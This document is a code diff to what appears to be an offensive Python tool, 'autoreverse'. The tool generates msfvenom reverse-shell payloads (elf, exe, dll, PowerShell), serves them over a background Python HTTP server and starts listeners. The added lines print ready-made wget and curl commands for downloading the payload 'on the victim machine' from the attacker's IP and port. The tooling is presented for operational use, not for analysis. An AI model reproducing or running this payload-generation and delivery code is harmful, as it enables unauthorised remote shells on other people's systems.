@@ -122,9 +122,11 @@ def Configure(IP = Get_IP(), PORT = str(args.port), msf = False, arch='64'):
         message(file)
     elif payload == 'elf' or payload == '.elf':
         file = 'autoreverse.elf'
-        print(blue('Creating the payload, please wait.\n'))
+        print(blue('\nCreating the payload, please wait.'))
         msfvenom = msfvenom.replace('windows', 'linux').replace('exe', 'elf')
         os.system(msfvenom)
+        if args.httpserver != None:
+            print(blue('\nDownload your payload on the victim machine with: ') + red("\nwget http://" + IP + ":" + args.httpserver + "/" + file))
         message(file)
     elif payload == 'powershell' or payload == 'ps1' or payload == '.ps1':
         file = 'autoreverse.ps1'
@@ -136,13 +138,17 @@ def Configure(IP = Get_IP(), PORT = str(args.port), msf = False, arch='64'):
         message(file)
     elif payload == 'exe' or payload == '.exe':
         file = 'autoreverse.exe'
-        print(blue('Creating the payload, please wait.\n'))
+        print(blue('\nCreating the payload, please wait.'))
         os.system(msfvenom)
+        if args.httpserver != None:
+            print(blue('\nDownload your payload on the victim machine with: ') + red('\ncurl "http://' + IP + ':' + args.httpserver + '/' + file + '" -o autoreverse.exe'))
         message(file)
     elif payload == 'dll' or payload == '.dll':
         file = 'autoreverse.dll'
-        print(blue('Creating the payload, please wait.\n'))
+        print(blue('\nCreating the payload, please wait.'))
         os.system(msfvenom.replace('exe', 'dll'))
+        if args.httpserver != None:
+            print(blue('\nDownload your payload on the victim machine with: ') + red('\ncurl "http://' + IP + ':' + args.httpserver + '/' + file + '" -o autoreverse.dll'))
         message(file)
     else:
         print(red('You payload option is not in the list, use "--help" to know the payloads list.'))
@@ -178,7 +184,7 @@ if args.httpserver != None:
     Check_Port(args.httpserver)
     server = 'python3 -m http.server ' + str(args.httpserver) + ' > /tmp/autoreverse.log 2>/dev/null &'
     os.system(server)
-    print(blue('\nHTTP Server running on port ' + str(args.httpserver)))
+    print(blue('\nHTTP server running on port ' + str(args.httpserver)))
 if args.listener != None:
     Check_Port(args.port)
     listeners()
